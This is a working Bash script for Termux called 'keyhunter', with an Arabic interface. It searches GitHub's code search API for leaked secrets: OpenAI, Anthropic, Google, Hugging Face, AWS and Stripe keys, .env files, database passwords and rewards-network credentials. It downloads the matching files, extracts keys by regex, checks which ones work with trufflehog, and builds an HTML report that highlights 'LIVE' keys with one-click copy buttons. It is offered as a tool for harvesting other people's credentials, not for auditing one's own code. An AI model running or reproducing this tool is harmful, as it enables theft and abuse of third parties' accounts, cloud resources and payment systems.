#!/data/data/com.termux/files/usr/bin/bash
# keyhunter v37 — Termux (GitHub API Direct = Fast)
set -uo pipefail

R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'; C='\033[0;36m'; B='\033[1m'; D='\033[2m'; M='\033[0;35m'; N='\033[0m'

OUT_DIR="$HOME/keyhunter_reports/run_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT_DIR"
HISTORY_FILE="$HOME/.keyhunter_history"
touch "$HISTORY_FILE"
SDCARD_DIR="/sdcard/KeyHunter"
mkdir -p "$SDCARD_DIR" 2>/dev/null || true

cleanup() {
    local exit_code=$?
    if [[ -f "$OUT_DIR/report.html" ]]; then
        find "$OUT_DIR" -type f ! -name "report.html" -delete
        local phone_report="$SDCARD_DIR/report_$(date +%Y%m%d_%H%M%S).html"
        cp "$OUT_DIR/report.html" "$phone_report" 2>/dev/null && \
            echo -e "\n${G}📱 Report: ${C}$phone_report${N}"
        command -v termux-open &>/dev/null && termux-open "$OUT_DIR/report.html" &
    else
        rm -rf "$OUT_DIR"
    fi
    exit $exit_code
}
trap cleanup EXIT INT TERM

get_token() {
    local TOKEN_FILE="$HOME/.keyhunter_gh_token"
    if [[ -f "$TOKEN_FILE" && -s "$TOKEN_FILE" ]]; then
        GH_TOKEN=$(cat "$TOKEN_FILE")
    else
        printf "${Y}GitHub Token:${N} "; read -r GH_TOKEN
        [[ -n "$GH_TOKEN" ]] && echo "$GH_TOKEN" > "$TOKEN_FILE" && chmod 600 "$TOKEN_FILE"
    fi
    [[ -z "${GH_TOKEN:-}" ]] && { echo -e "${R}No token.${N}"; exit 1; }
}

strict_regex() {
    local secret="$1"; local rule="$2"; local len=${#secret}
    echo "$secret" | grep -qiE 'YOUR|EXAMPLE|XXXX|CHANGE_?ME|PLACEHOLDER|TODO|DUMMY|TEST_?KEY|FAKE' && return 1
    [[ "$secret" =~ ^(.)\1{5,}$ ]] && return 1
    case "$rule" in
        *github*) [[ "$secret" =~ ^gh[pousr]_[A-Za-z0-9]{36,}$ ]] || [[ "$secret" =~ ^github_pat_ ]] ;;
        *aws*|*AKIA*) [[ "$secret" =~ ^(AKIA|ASIA)[0-9A-Z]{16}$ ]] ;;
        *openai*) [[ "$secret" =~ ^sk-(proj-)?[A-Za-z0-9_-]{40,}$ ]] ;;
        *stripe*) [[ "$secret" =~ ^sk_live_[0-9a-zA-Z]{24,}$ ]] ;;
        *gcp*|*google*) [[ "$secret" =~ ^AIzaSy[A-Za-z0-9_-]{33}$ ]] ;;
        *huggingface*|*hf_*) [[ "$secret" =~ ^hf_[A-Za-z0-9]{34,}$ ]] ;;
        *anthropic*) [[ "$secret" =~ ^sk-ant-api03-[A-Za-z0-9_-]{80,}$ ]] ;;
        *generic*|*api*key*|*sk-*|*jwt*|*private-key*) [ "$len" -ge 20 ] ;;
        *) [ "$len" -ge 8 ] ;;
    esac
}

# دالة لاستخراج المفاتيح من محتوى الملف باستخدام Regex
extract_keys_from_content() {
    local content="$1"
    local url="$2"
    local rule="$3"
    local file="$4"
    
    # OpenAI
    echo "$content" | grep -oE 'sk-(proj-)?[A-Za-z0-9_-]{40,}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
    
    # Anthropic
    echo "$content" | grep -oE 'sk-ant-api03-[A-Za-z0-9_-]{80,}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
    
    # HuggingFace
    echo "$content" | grep -oE 'hf_[A-Za-z0-9]{34,}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
    
    # AWS
    echo "$content" | grep -oE '(AKIA|ASIA)[0-9A-Z]{16}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
    
    # GCP
    echo "$content" | grep -oE 'AIzaSy[A-Za-z0-9_-]{33}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
    
    # GitHub PAT
    echo "$content" | grep -oE 'gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{60,}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
    
    # Stripe
    echo "$content" | grep -oE 'sk_live_[0-9a-zA-Z]{24,}' | while read -r sec; do
        printf "%s\0%s\0%s\0%s\0" "$sec" "$rule" "$url" "$file"
    done
}
export -f extract_keys_from_content

main() {
    clear
    echo -e "${B}${C}╔══════════════════════════════════════╗${N}"
    echo -e "${B}${C}║  KEYHUNTER v37 · Fast API Edition    ║${N}"
    echo -e "${B}${C}╚══════════════════════════════════════╝${N}\n"

    get_token

    echo -e "${B}اختر الهدف:${N}"
    echo -e "  ${C}1)${N} AI Keys"
    echo -e "  ${C}2)${N} CPA/Rewards"
    echo -e "  ${C}3)${N} Files & Passwords"
    echo -e "  ${C}4)${N} Custom (Enter فارغ للبدء)"
    echo -e "  ${C}5)${N} ALL"
    read -rp "→ " choice

    local -a QUERIES=()
    [[ "$choice" == *"1"* || "$choice" == *"5"* ]] && QUERIES+=("sk-proj-" "sk-ant-api03-" "AIzaSy" "hf_")
    [[ "$choice" == *"2"* || "$choice" == *"5"* ]] && QUERIES+=("rapidoreach" "lootably" "adgem" "cpagrip")
    [[ "$choice" == *"3"* || "$choice" == *"5"* ]] && QUERIES+=("filename:.env" "DB_PASSWORD" "AWS_ACCESS_KEY_ID")
    
    if [[ "$choice" == *"4"* ]]; then
        echo -e "\n${B}كلمات البحث (سطر لكل كلمة، Enter فارغ للبدء):${N}"
        while IFS= read -r custom_kw; do
            [[ -z "$custom_kw" ]] && break
            custom_kw=$(echo "$custom_kw" | xargs)
            [[ -n "$custom_kw" ]] && QUERIES+=("$custom_kw")
        done
    fi

    [[ ${#QUERIES[@]} -eq 0 ]] && { echo -e "${R}لا شيء محدد.${N}"; exit 1; }

    # ========== المرحلة 1: جلب الملفات عبر GitHub API ==========
    echo -e "\n${B}${C}▶ [1/3] جلب الملفات من GitHub API...${N}"
    echo -e "${D}عدد الكلمات: ${#QUERIES[@]}${N}\n"
    
    local candidates_raw="$OUT_DIR/raw_files.txt"
    : > "$candidates_raw"
    local total_q=${#QUERIES[@]}
    
    for i in "${!QUERIES[@]}"; do
        local kw="${QUERIES[$i]}"
        local num=$((i+1))
        
        printf "\r\033[K${C}⟳ [%d/%d]${N} البحث عن: ${B}%s${N}" "$num" "$total_q" "$kw"
        
        # URL encoding
        local encoded_kw=$(echo "$kw" | jq -sRr @uri)
        local url="https://api.github.com/search/code?q=${encoded_kw}&per_page=30"
        
        local response=$(curl -s -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github.v3+json" "$url")
        
        local err_msg=$(echo "$response" | jq -r '.message // empty' 2>/dev/null)
        if [[ -n "$err_msg" ]]; then
            printf "\r\033[K${Y}⚠ [%d/%d] %s: %s${N}\n" "$num" "$total_q" "$kw" "$err_msg"
            sleep 5
            continue
        fi
        
        local items_count=$(echo "$response" | jq '.items | length' 2>/dev/null || echo 0)
        printf "\r\033[K${G}✓ [%d/%d] %s: %d ملف${N}\n" "$num" "$total_q" "$kw" "$items_count"
        
        # استخراج روابط الملفات
        echo "$response" | jq -r '.items[]? | "\(.html_url)|\(.repository.full_name)|\(.path)|'"$kw"'"' >> "$candidates_raw" 2>/dev/null
        sleep 2
    done

    local total_files=$(wc -l < "$candidates_raw" 2>/dev/null || echo 0)
    [[ "$total_files" -eq 0 ]] && { echo -e "\n${R}✗ لا ملفات.${N}"; exit 0; }
    echo -e "\n${G}✓ إجمالي الملفات: $total_files${N}"

    # ========== المرحلة 2: تحميل الملفات واستخراج المفاتيح ==========
    echo -e "\n${B}${C}▶ [2/3] تحميل الملفات واستخراج المفاتيح...${N}"
    
    local candidates="$OUT_DIR/candidates.txt"
    : > "$candidates"
    declare -A HISTORY_HASHES
    while IFS= read -r h; do [[ -n "$h" ]] && HISTORY_HASHES["$h"]=1; done < "$HISTORY_FILE"

    local count=0
    local valid=0
    local skipped=0

    while IFS='|' read -r html_url repo path rule; do
        count=$((count+1))
        [[ -z "$html_url" ]] && continue
        
        printf "\r\033[K${C}⟳ [%d/%d]${N} تحميل: ${D}%s${N}" "$count" "$total_files" "$path"
        
        # تحويل رابط الصفحة إلى raw
        local raw_url=$(echo "$html_url" | sed 's|github.com|raw.githubusercontent.com|; s|/blob/|/|')
        local content=$(curl -s -L "$raw_url" 2>/dev/null)
        
        [[ -z "$content" ]] && continue
        
        # استخراج المفاتيح
        while IFS= read -r -d '' secret && IFS= read -r -d '' s_rule && IFS= read -r -d '' s_url && IFS= read -r -d '' s_file; do
            [[ -z "$secret" ]] && continue
            
            local hash=$(echo -n "$secret" | sha256sum | cut -d' ' -f1)
            [[ -n "${HISTORY_HASHES[$hash]:-}" ]] && continue
            
            if strict_regex "$secret" "$s_rule"; then
                printf "%s\0%s\0%s\0%s\0" "$secret" "$s_rule" "$s_url" "$s_file" >> "$candidates"
                echo "$hash" >> "$HISTORY_FILE"
                valid=$((valid+1))
                printf "\033[1A\033[K${G}🔑 صالح #%d: ${D}%s${N}\n" "$valid" "$s_rule"
            else
                skipped=$((skipped+1))
            fi
        done < <(extract_keys_from_content "$content" "$html_url" "$rule" "$path")
        
        sleep 0.5
    done < "$candidates_raw"

    local total_valid=$((valid))
    echo -e "\n${G}✓ صالحة: $total_valid${N} | ${Y}متخطاة: $skipped${N}"
    [[ "$total_valid" -eq 0 ]] && { echo -e "${Y}لا مفاتيح جديدة.${N}"; exit 0; }

    # ========== المرحلة 3: التحقق ==========
    echo -e "\n${B}${C}▶ [3/3] التحقق الفعلي...${N}"
    echo -e "${D}فحص $total_valid مفتاح.${N}\n"
    
    cat > "$OUT_DIR/verify.sh" << 'VEOF'
#!/data/data/com.termux/files/usr/bin/bash
secret="$1"; rule="$2"; url="$3"; file="$4"
res=$(echo "$secret" | timeout 8s trufflehog stdin --only-verified --json 2>/dev/null | head -1)
data="${secret}|${rule}|${url}|${file}"
if [[ -n "$res" ]]; then printf "%s\n" "$data" >> "$5/live.tmp"; else printf "%s\n" "$data" >> "$5/dead.tmp"; fi
VEOF
    chmod +x "$OUT_DIR/verify.sh"

    : > "$OUT_DIR/live.tmp"
    : > "$OUT_DIR/dead.tmp"

    local start_verify=$(date +%s)
    cat "$candidates" | xargs -0 -n4 -P 8 bash -c '"$0" "$1" "$2" "$3" "$4" "'"$OUT_DIR"'"' "$OUT_DIR/verify.sh" &
    local VPID=$!
    local last_live=0

    while kill -0 $VPID 2>/dev/null; do
        local lc=$(wc -l < "$OUT_DIR/live.tmp" 2>/dev/null || echo 0)
        local dc=$(wc -l < "$OUT_DIR/dead.tmp" 2>/dev/null || echo 0)
        local tc=$((lc + dc))
        local pct=0
        [[ $total_valid -gt 0 ]] && pct=$((tc * 100 / total_valid))
        local now=$(date +%s)
        local v_elapsed=$((now - start_verify))
        
        printf "\033[1A\033[K${C}⟳${N} ${B}%3d%%${N} [%d/%d] | ${R}🔥 %d${N} | ${D}💀 %d${N} | ${Y}%ds${N}\n" "$pct" "$tc" "$total_valid" "$lc" "$dc" "$v_elapsed"
        
        if [[ $lc -gt $last_live ]]; then
            printf "${R}${B}🔥 LIVE #%d!${N}\n" "$lc"
            last_live=$lc
        fi
        sleep 0.5
    done
    wait $VPID
    
    local final_live=$(wc -l < "$OUT_DIR/live.tmp")
    local final_dead=$(wc -l < "$OUT_DIR/dead.tmp")
    echo -e "${G}✓${N} مكتمل! ${R}🔥 LIVE: $final_live${N} | ${D}💀 DEAD: $final_dead${N}"

    # ========== تقرير HTML ==========
    echo -e "\n${B}${C}▶ بناء التقرير...${N}"
    local html="$OUT_DIR/report.html"

    cat > "$html" << 'HTML_HEAD'
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KeyHunter Report</title>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,"Segoe UI",Roboto,sans-serif;background:#0d1117;color:#c9d1d9;margin:0;padding:16px;font-size:15px;line-height:1.5}
h1{font-size:22px;color:#58a6ff;text-align:center;margin:0 0 8px}
h2{font-size:18px;border-bottom:2px solid #30363d;padding-bottom:8px;margin:24px 0 12px}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:16px 0}
.stat{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px;text-align:center}
.stat-num{font-size:28px;font-weight:bold;display:block}
.stat-lbl{font-size:12px;color:#8b949e;margin-top:4px}
.live-num{color:#f85149}.dead-num{color:#8b949e}
.search{width:100%;padding:14px;background:#161b22;border:1px solid #30363d;color:#fff;border-radius:10px;font-size:16px;margin-bottom:16px;outline:none}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;margin-bottom:12px;padding:14px;border-right:4px solid #30363d}
.card.live{border-right-color:#f85149;box-shadow:0 0 12px rgba(248,81,73,0.15)}
.card-header{margin-bottom:10px}
.badge{font-size:11px;font-weight:bold;padding:4px 10px;border-radius:12px;background:#21262d;color:#58a6ff;text-transform:uppercase}
.card.live .badge{background:#da3633;color:#fff}
.file{font-size:12px;color:#8b949e;word-break:break-all;margin-bottom:10px;font-family:monospace}
.secret-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:10px;font-family:monospace;font-size:13px;word-break:break-all;color:#f0c000;margin-bottom:10px}
.actions{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.btn{padding:12px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;display:block}
.btn-copy{background:#238636;color:#fff;border:none}
.btn-copy.copied{background:#1f6feb}
.btn-visit{background:#1f6feb;color:#fff}
.btn-visit.disabled{background:#21262d;color:#8b949e;pointer-events:none}
.empty{text-align:center;color:#8b949e;padding:40px 20px;font-style:italic}
.footer{text-align:center;color:#8b949e;font-size:12px;margin-top:30px;padding-top:16px;border-top:1px solid #30363d}
</style>
<script>
function filterAll(){const q=document.getElementById('searchInput').value.toLowerCase();document.querySelectorAll('.card').forEach(c=>{c.style.display=c.innerText.toLowerCase().includes(q)?'':'none'})}
function copySecret(btn){const b64=btn.getAttribute('data-b64');navigator.clipboard.writeText(atob(b64)).then(()=>{const o=btn.innerHTML;btn.innerHTML='✅ تم النسخ';btn.classList.add('copied');setTimeout(()=>{btn.innerHTML=o;btn.classList.remove('copied')},1500)}).catch(()=>alert('فشل النسخ'))}
</script>
</head>
<body>
<h1>🎯 KeyHunter Report</h1>
<input type="text" id="searchInput" class="search" oninput="filterAll()" placeholder="🔍 ابحث...">
HTML_HEAD

    local live_count=$(wc -l < "$OUT_DIR/live.tmp")
    local dead_count=$(wc -l < "$OUT_DIR/dead.tmp")
    echo "<div class='stats'><div class='stat'><span class='stat-num live-num'>$live_count</span><span class='stat-lbl'>🔥 LIVE</span></div><div class='stat'><span class='stat-num dead-num'>$dead_count</span><span class='stat-lbl'>💀 DEAD</span></div></div>" >> "$html"

    echo "<h2>🔥 مفاتيح حية</h2>" >> "$html"
    if [[ -s "$OUT_DIR/live.tmp" ]]; then
        while IFS='|' read -r secret rule url file; do
            [[ -z "$secret" ]] && continue
            local b64=$(echo -n "$secret" | base64 -w 0 2>/dev/null || echo -n "$secret" | base64 | tr -d '\n')
            local masked="${secret:0:10}...${secret: -4}"
            echo "<div class='card live'><div class='card-header'><span class='badge'>$rule</span></div>" >> "$html"
            echo "<div class='file'>📁 $file</div><div class='secret-box'>$masked</div>" >> "$html"
            echo "<div class='actions'><button class='btn btn-copy' data-b64='$b64' onclick=\"copySecret(this)\">📋 نسخ</button>" >> "$html"
            if [[ -n "$url" ]]; then echo "<a href='$url' target='_blank' class='btn btn-visit'>🌐 المستودع</a>" >> "$html"; else echo "<a class='btn btn-visit disabled'>لا رابط</a>" >> "$html"; fi
            echo "</div></div>" >> "$html"
        done < "$OUT_DIR/live.tmp"
    else
        echo "<div class='empty'>لا توجد مفاتيح حية 🎉</div>" >> "$html"
    fi

    echo "<h2>💀 مفاتيح ميتة</h2>" >> "$html"
    if [[ -s "$OUT_DIR/dead.tmp" ]]; then
        while IFS='|' read -r secret rule url file; do
            [[ -z "$secret" ]] && continue
            echo "<div class='card'><div class='card-header'><span class='badge'>$rule</span></div>" >> "$html"
            echo "<div class='file'>📁 $file</div><div class='actions'>" >> "$html"
            if [[ -n "$url" ]]; then echo "<a href='$url' target='_blank' class='btn btn-visit'>🌐 المستودع</a>" >> "$html"; else echo "<a class='btn btn-visit disabled'>لا رابط</a>" >> "$html"; fi
            echo "</div></div>" >> "$html"
        done < "$OUT_DIR/dead.tmp"
    else
        echo "<div class='empty'>لا توجد مفاتيح ميتة</div>" >> "$html"
    fi

    echo "<div class='footer'>KeyHunter v37 · Termux · $(date)</div></body></html>" >> "$html"
    echo -e "${G}✓ تم إنشاء التقرير${N}"
}

main "$@"
